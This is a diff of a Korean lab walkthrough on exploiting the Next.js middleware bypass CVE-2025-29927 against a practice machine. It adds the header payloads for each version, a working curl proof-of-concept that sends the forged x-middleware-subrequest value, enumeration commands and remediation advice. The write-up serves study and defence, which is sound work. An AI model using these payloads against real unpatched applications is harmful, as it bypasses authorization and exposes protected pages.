@@ -179,7 +179,8 @@ Nmap done: 1 IP address (1 host up) scanned in 54.93 seconds
 | 웹 프레임워크 | **Next.js** | `X-Powered-By: Next.js` 응답 헤더 (근거 1) + `/_next/static/...` 자산 경로 (근거 2) |
 | 라우팅 방식 | **Pages Router** | `_next/static/chunks/pages/index-*.js`, `<meta name="next-head-count">` |
 | 빌드 ID | `y--UTiBhyE-_5xl_ZjRqu` | `/_next/static/<buildId>/_buildManifest.js` 경로 |
-| 정확한 Next.js 버전 | **미확정** `[가정]` | 외부에서 버전 문자열이 노출되지 않았다. 익스플로잇이 **성공했다는 사실**로 "패치 이전 버전"임만 확정된다 |
+| 미들웨어 모듈 이름 | **`middleware`** (루트 `middleware.ts`) | 산출물 `CVE-2025-29927/poc.sh`가 `middleware` 5회 반복으로 성공했다 (3장) → **12.2 이상 확정** |
+| 정확한 Next.js 버전 | **미확정** `[가정]` | 외부에서 버전 문자열이 노출되지 않았다. 익스플로잇이 **성공했다는 사실**로 "패치 이전"임만, 모듈 이름으로 "12.2 이상"임만 확정된다 |
 | OS | **Ubuntu 24.04.1 LTS**, 커널 6.8.0-58 | SSH 배너의 `Ubuntu 3ubuntu13.11` (근거 1) + 로그인 후 MOTD (근거 2). nmap의 OS 추측(`4.15–5.19`, MikroTik)은 **전부 틀렸다** |
 
 > [!warning] nmap OS 추측을 믿지 마라
@@ -266,15 +267,17 @@ by Ben "epi" Risher 🤓                 ver: 2.13.1
 >
 > **탈출구 3가지:**
 > ```bash
-> # ① 자동 필터 끄기
+> # ① 자동 필터 끄기 — auto-filter를 끄는 유일한 방법
 > feroxbuster -u http://192.168.248.215:3000/ -w <wordlist> --dont-filter
 >
-> # ② 리다이렉트 상태코드를 명시적으로 남기기 (다른 필터로 대체)
-> feroxbuster -u ... --filter-status 404 -C 404
+> # ② ①을 켠 채로 404만 명시적으로 걸러 노이즈를 줄인다 (-D 없이는 성립하지 않는다)
+> feroxbuster -u ... -D -C 404
 >
-> # ③ 리다이렉트를 따라가서 최종 응답으로 판정
+> # ③ 리다이렉트를 따라가서 최종 응답으로 판정 — 경로 발견용이지, 우회 성공 판정용이 아니다
 > feroxbuster -u ... -r
 > ```
+> **`-C`는 `--filter-status`의 축약형이다** — 둘을 나란히 쓰면 같은 플래그를 두 번 쓰는 것일 뿐이고, `-C`는 **deny-list**여서 wildcard auto-filter를 **끄지 못한다.** 그것을 끄는 것은 `-D/--dont-filter` 하나뿐이라 ②는 반드시 ①과 조합돼야 한다.
+> ③의 `-r`도 마찬가지로 **열거 단계 전용**이다. 3장의 우회 성공 판정 단계에서 리다이렉트를 따라가면 `curl -L`과 똑같이 성공을 실패로 오판한다(3장 · 7장 6번).
 > `gobuster`를 쓴다면 `-s 200,204,301,302,307,308,401,403` 로 **307/308을 명시**하고, `ffuf`라면 `-mc all -fs <404크기>` 로 **코드가 아니라 크기로 거른다.**
 
 > [!tip] 결과에서 실제로 건진 정보
@@ -334,8 +337,13 @@ export function middleware(request: NextRequest) {
   return NextResponse.next()
 }
 
+// matcher의 실제 범위는 미상 [가정] — 확정된 것은 "최소 /admin을 포함한다"뿐이다
 export const config = { matcher: ['/admin/:path*'] }
 ```
+
+> [!warning] `matcher`를 `['/admin/:path*']`로 못박지 마라 — 관측과 어긋난다
+> feroxbuster의 auto-filter는 **존재하지 않는 무작위 경로**에 대한 응답을 보고 만들어진다. 그 필터가 **307**으로 생성됐다는 것은 **무작위 경로도 307을 냈다**는 뜻이고, 그러면 `matcher`가 `/admin`보다 **훨씬 넓다**(예: `'/((?!_next|api).*)'` 류의 catch-all)는 결론이 나온다.
+> 위 코드는 **설명용 최소 형태**이고, 이 박스의 실제 값은 **"최소 `/admin` 포함, 실제 범위 미상"** 이다 `[가정]`. 소스를 확보하지 않은 채 범위를 단정하면 "왜 `/profile`은 200인가" 같은 질문에서 앞뒤가 맞지 않는다.
 
 > [!note] 왜 여기에 인가를 넣고 싶어지는가
 > - **한 곳에서 전부 처리된다** — 라우트가 100개여도 미들웨어 한 파일이면 끝
@@ -387,7 +395,7 @@ if (subrequests.includes(middlewareInfo.name)) {
 | 14.x | `< 14.2.25` | **14.2.25** |
 | 13.x | `< 13.5.9` | **13.5.9** |
 | 12.x | `< 12.3.5` | **12.3.5** |
-| 11.1.4 ~ | 영향 있음 | **공식 백포트 없음** → 엣지에서 헤더 차단이 유일한 대응 |
+| 11.1.4 ~ 12.3.4 | 영향 있음 | **12.3.5** — GHSA-f82v-jwr5-mffw가 정식 수정을 12.3.5로 명시한다. **11.x 전용 백포트가 없을 뿐 "공식 대응이 없다"는 뜻이 아니다** → 12.3.5로 올리는 것이 공식 경로 |
 
 ### 2-3. 왜 이 페이로드인가 — 조각별 해설
 
@@ -402,17 +410,29 @@ if (subrequests.includes(middlewareInfo.name)) {
 
 버전별 최소 페이로드:
 
+| 버전대 | 미들웨어 파일 | 헤더 값(모듈 이름) | 반복 조건 |
+|---|---|---|---|
+| `11.1.4 ~ 12.1` | `pages/_middleware.ts` | `pages/_middleware` | 1회 — `includes()` 판정 |
+| `12.2 ~ 15.x` | 루트 `middleware.ts` | `middleware` | 1회 — `includes()` 판정 |
+| `12.2 ~ 15.x` (소스가 `src/` 아래) | `src/middleware.ts` | `src/middleware` | 1회 — `includes()` 판정 |
+| `15.x` | 루트 `middleware.ts` | `middleware` | **5회 이상** — `MAX_RECURSION_DEPTH`(=5) **개수** 판정 |
+
+> [!warning] `pages/_middleware`는 **라우터 종류가 아니라 버전** 문제다
+> `pages/_middleware.ts`는 **11.1.4 ~ 12.1 전용 구식 배치**이고, **12.2부터 루트 `middleware.ts` 하나로 강제**됐다. Pages Router를 쓰는 15.x 앱도 미들웨어 파일은 **루트 `middleware.ts`**다.
+> 즉 `chunks/pages/`를 보고 "Pages Router니까 `pages/_middleware`"라고 추론하는 것은 **인과가 틀렸다.** 판별 기준은 라우터가 아니라 **12.2 이전인가**다.
+> 실물 반증: 산출물의 재현랩 `CVE-2025-29927/next15/`(next 15.1.7)는 `pages/` 디렉터리를 쓰면서도 미들웨어는 **루트 `middleware.ts`** 다.
+
 ```http
-# Next.js 11.x ~ 12.x — Pages Router 구식 미들웨어 (pages/_middleware.ts)
+# Next.js 11.1.4 ~ 12.1 — 구식 pages/_middleware.ts
 x-middleware-subrequest: pages/_middleware
 
-# Next.js 12.2 ~ 14.x — 루트 middleware.ts
+# Next.js 12.2 ~ 15.x — 루트 middleware.ts (12.2부터 이 배치로 강제)
 x-middleware-subrequest: middleware
 
 # 소스가 src/ 아래에 있는 프로젝트 (src/middleware.ts)
 x-middleware-subrequest: src/middleware
 
-# Next.js 15.x — 재귀 깊이 5 이상 필요
+# Next.js 15.x — 같은 이름 5회 이상 (재귀 깊이 카운트)
 x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
 ```
 
@@ -421,7 +441,8 @@ x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
 > ```
 > x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:pages/_middleware
 > ```
-> 이 박스는 **Pages Router**(`chunks/pages/`)이므로 `pages/_middleware`와 `middleware` 둘 다 후보였다 `[가정]` — 원문에 실제 사용 값이 기록돼 있지 않다.
+> **이 박스에서 실제로 쓴 값은 `middleware` 5회 반복으로 확정됐다** — 산출물 `~/PG/MiddlewareBypass/CVE-2025-29927/poc.sh`에 남아 있다(3장에 원문 인용). 즉 **모듈 이름은 루트 `middleware`**다.
+> 만약 이 박스가 **구버전(12.2 미만)이라면** `pages/_middleware`도 후보였겠지만, `middleware`가 통했으므로 그 가지는 닫힌다. 미해소로 남는 것은 **Next.js 정확한 버전** 하나뿐이다 `[가정]`.
 > **시험장 원칙: 버전 특정에 시간을 쓰지 말고 만능 값을 한 번 던져 본다.** 실패하면 그때 버전을 판다.
 
 > [!danger] 정탐/오탐 판정 기준 — 무엇을 봐야 "진짜 뚫렸다"인가
@@ -477,7 +498,7 @@ export function middleware(req: NextRequest) {
   }
   return NextResponse.next()
 }
-export const config = { matcher: ['/admin/:path*'] }
+export const config = { matcher: ['/admin/:path*'] }   // ← 최소 /admin 포함, 실제 범위 미상 [가정] (2-1 참조)
 
 // pages/admin.tsx — 검사가 전혀 없다. "미들웨어가 이미 걸렀다"고 가정
 export default function Admin() {
@@ -564,9 +585,22 @@ This is an admin-only section.
 root:modeling-katja-lad-common
 ```
 
-> [!note] 재현 절차 — 수동 `curl`
-> 원문에는 셸 프롬프트가 `~/PG/MiddlewareBypass/CVE-2025-29927` 로 남아 있어 **PoC 스크립트를 클론해서 사용한 것으로 보인다** `[가정]`. 정확한 호출 명령은 기록돼 있지 않다.
-> 아래는 **도구 없이 같은 결과를 내는 절차**다 — 시험 자산은 이쪽이다.
+> [!note] 실제로 사용한 페이로드 — 산출물에 남아 있다
+> `~/PG/MiddlewareBypass/CVE-2025-29927/` 는 **`https://github.com/EQSTLab/CVE-2025-29927.git` 를 클론한 것으로 확정**됐다(`git remote -v`). 그 안의 `poc.sh` 원문:
+>
+> ```bash
+> #!/bin/bash
+>
+> curl -v "http://192.168.248.215:3000/admin" \
+>   -H "Host: 192.168.248.215:3000" \
+>   -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
+> ```
+>
+> **성공한 값은 `middleware` 5회 반복**이다 — 즉 모듈 이름은 루트 `middleware`, 그리고 **5회 반복이 필요했다면 15.x 계열**일 가능성이 크다(구버전은 1회로 충분하다). 다만 5회는 구버전의 `includes()`도 함께 만족시키므로 **버전 확정 근거는 되지 못한다** `[가정]`.
+> 같은 디렉터리에는 exploit-db 사본 `52124.txt`와 **로컬 재현랩 `next15/`**(next 15.1.7)가 함께 있다. `next15/`는 **익스플로잇 저장소가 제공하는 자체 재현 환경**이지 타겟의 버전이 아니다 — 혼동하면 안 된다.
+
+> [!note] 재현 절차 — 도구 없이 수동 `curl`
+> 아래는 **PoC 스크립트 없이 같은 결과를 내는 절차**다 — 시험 자산은 이쪽이다.
 >
 > ```bash
 > # ① 우회 전 — 기준선 확보 (307로 튕기는지 확인)
@@ -706,7 +740,7 @@ ba5f29a3abb6692d4a1676fc93864d6a
 | | 위치 | 값 |
 |---|---|---|
 | `proof.txt` | `/root/proof.txt` | `ba5f29a3abb6692d4a1676fc93864d6a` |
-| `local.txt` | **없음** | 포털 진행도 `1/1` — 사용자 단계 없이 root 직행 구성 |
+| `local.txt` | **관측되지 않음** | 원문·산출물에는 **`root` 플래그만 관측됐다.** 사용자 단계가 애초에 없는 구성인지, 있었는데 수집하지 않았는지는 근거가 없다 `[가정]` |
 
 > [!tip] 시험 증거 형식 연습
 > 실제 시험은 플래그만으론 인정되지 않는다. **한 화면에** 담아라:
@@ -819,6 +853,12 @@ Next.js 앞에 nginx/Cloudflare/ALB가 있고 **이미 완화 조치가 적용�
 > - **백엔드 포트(3000·8080)가 별도로 열려 있으면 프록시를 아예 건너뛴다** — 2-7장 표 5번 벡터
 >
 > **이 박스는 3000이 직접 열려 있었다.** 즉 우회할 프록시조차 없는 최선의 조건이었다. 실전에서 실패하면 **프록시를 지나칠 방법**을 먼저 찾아라.
+>
+> 그리고 그 판단의 근거가 정찰 단계에 이미 있었다 — `whatweb.txt`:
+> ```
+> http://192.168.248.215:3000 [200 OK] Country[RESERVED][ZZ], HTML5, IP[192.168.248.215], Script[application/json], X-Powered-By[Next.js]
+> ```
+> **`Server` 헤더가 아예 없고 `X-Powered-By[Next.js]`만 있다.** `nginx`·`cloudflare` 같은 값도, `CF-Ray`·`Via`·`X-Cache`도 없다 → **중간 계층 없음**을 페이로드를 던지기 전에 확정할 수 있었다. whatweb 출력은 배너 나열이 아니라 **"헤더가 백엔드까지 가는가"의 사전 판정 자료**다.
 
 ### ⑦ `/unauthorized`가 200으로 나온 것을 흘려보내면 안 됐다
 
@@ -849,7 +889,7 @@ feroxbuster 결과에서 `/unauthorized`는 **200**으로 정상 표시됐다. �
 | 함정 | 증상 | 탈출 |
 |---|---|---|
 | 3000번을 "개발 서버라 별거 없다"고 후순위로 미룸 | 22·3000 두 포트뿐인데 SSH만 판다 | **열린 포트가 2개면 웹이 곧 유일한 공격면**이다 |
-| `X-Powered-By: Next.js`를 보고 곧장 App Router 페이로드만 시도 | 이 박스는 Pages Router | 청크 경로(`chunks/pages/` vs `chunks/app/`)로 먼저 판별 |
+| 라우터 종류(App/Pages)로 헤더 값을 고르려 함 | 모듈 이름은 **버전**이 정한다(12.2 이전만 `pages/_middleware`). 라우터로는 갈리지 않는다 — 2-3장 | 값을 고르지 말고 **`:`로 이어 붙여 한 번에** 던진다. 이 박스의 정답은 `middleware`×5였다 |
 | API 라우트(`/api/*`)를 열거하지 않음 | 미들웨어가 API도 보호하는 경우가 많다 | `/api/` 하위를 별도 워드리스트로 스캔. **API가 더 많은 것을 흘린다** |
 | 크리덴셜을 SSH에만 시도 | 재사용처를 놓친다 | 웹 로그인 · DB · 다른 호스트에도 시도 |
 | root 셸을 잡고 즉시 종료 | 왜 뚫렸는지 학습 기회 상실 | **소스와 설정 파일을 읽고 나온다** (4장 마지막 참조) |
@@ -966,7 +1006,7 @@ feroxbuster 결과에서 `/unauthorized`는 **200**으로 정상 표시됐다. �
 | 결함 | 왜 위험한가 | 조치 |
 |---|---|---|
 | **인가가 미들웨어에만 있다** | 앞단을 우회하는 방법 하나로 전체 인가가 무너진다. 이 박스가 정확히 그랬다 | **인가를 라우트 핸들러 자체에** 두기. `getServerSideProps`/API 라우트/서버 컴포넌트 안에서 세션을 다시 검증한다. 미들웨어는 **UX용 조기 리다이렉트**로만 쓴다 |
-| **패치되지 않은 Next.js** | CVE-2025-29927, CVSS 9.1 | **15.2.3 / 14.2.25 / 13.5.9 / 12.3.5 이상**으로 업그레이드. 11.x대는 공식 패치가 없으므로 아래 항목이 유일한 대응 |
+| **패치되지 않은 Next.js** | CVE-2025-29927, CVSS 9.1 | **15.2.3 / 14.2.25 / 13.5.9 / 12.3.5 이상**으로 업그레이드. **11.1.4~12.3.4는 12.3.5로 올리는 것이 공식 경로**다(11.x 전용 백포트만 없다). 업그레이드가 당장 불가하면 아래 헤더 차단이 임시 완화 |
 | **`x-middleware-subrequest`가 엣지에서 제거되지 않음** | 내부 전용 표식을 외부가 위조 | 리버스 프록시/CDN에서 **외부 유입 시 무조건 제거**:<br>`proxy_set_header x-middleware-subrequest "";` (nginx)<br>Cloudflare/Vercel은 Transform Rule로 헤더 삭제 |
 | **내부 신호를 검증 없는 헤더로 전달** | 서명·논스가 없으면 누구나 위조 가능 | 프레임워크 설계 차원: **HMAC 서명된 논스**나 프로세스 내부 컨텍스트로 전달. 헤더로 신뢰를 전달하지 않는다 |
 | **정규화 지점이 여러 곳** | 프록시와 앱의 경로 해석이 갈리면 필터가 새어나간다 | **정규화를 한 곳에서만** 수행하고, 그 결과를 뒷단에 전달. 프록시 규칙은 정규화 **이후** 경로에 건다 |
